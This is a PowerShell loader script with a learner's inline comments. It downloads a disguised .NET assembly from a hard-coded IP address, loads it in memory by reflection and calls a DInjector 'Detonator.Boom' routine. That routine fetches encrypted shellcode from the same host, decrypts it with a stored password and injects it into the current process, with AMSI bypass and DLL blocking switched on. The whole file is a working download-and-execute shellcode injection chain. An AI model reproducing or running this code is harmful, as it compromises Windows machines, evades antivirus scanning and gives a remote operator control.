sV "YuE51" ([type]("System.Reflection.Assembly")) # Set-Variable YuE51 [variables are not case-sensitive in ps] and it returns an object
$A = "currentthread" # module name
$B = "147.182.172.189" # lhost
$C = 80 # lport
$D = "user32.dll" # injector filename
$E = "9tVI0" # encrypted shellcode filename
$F = "z64&Rx27Z$B%73up" # password to decrypt the shellcode
$G = "C:\Windows\System32\svchost.exe"
$H = "notepad"
$I = "explorer"
$J = "msvcp_win.dll"
$K = "True" # bypass 3rd party dll's
$L = "True" # bypass amsi

$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended") # array
if ($methods.Contains("currentthread")) { # this checks if currentthread is present in the above $methods array, but here it doesn't
    $H = (Start-Process -WindowStyle Hidden -PassThru "notepad").Id
}

$methods = @("remotethreadapc", "remotethreadcontext", "processhollow") # this checks if currentthread is present in the above $methods array, but here it doesn't
if ($methods.Contains("currentthread")) {
    try {
        $I = (Get-Process "explorer" -ErrorAction Stop).Id
    }
    catch {
        $I = 0
    }
}

# the above 2 functions are not gonna execute
# inject shellcode into the current process

$cmd = "currentthread /sc:http://147.182.172.189:80/9tVI0 /password:'z64&Rx27Z$B%73up' /image:C:\Windows\System32\svchost.exe /pid:notepad /ppid:explorer /dll:msvcp_win.dll /blockDlls:True /am51:True"

$data = (IWR -UseBasicParsing "http://147.182.172.189:80/user32.dll").Content # web request, converts user32.dll to array of numbers
$assem =  [System.Reflection.Assembly]::Load($data) # object is being called {use LoadFile instead}

$flags = [Reflection.BindingFlags] "NonPublic,Static" # juzz some binding flags, not imp {searchs based on this criteria and passed onto $entry}

$class = $assem.GetType("DInjector.Detonator", $flags) # get file
$entry = $class.GetMethod("Boom", $flags) # it gets the function boom from Detonator.cs

$entry.Invoke($null, $cmd.Split(" ")) # splits cmd

# from here the execution is transfered to tat c# file which then decrypts the shellcode
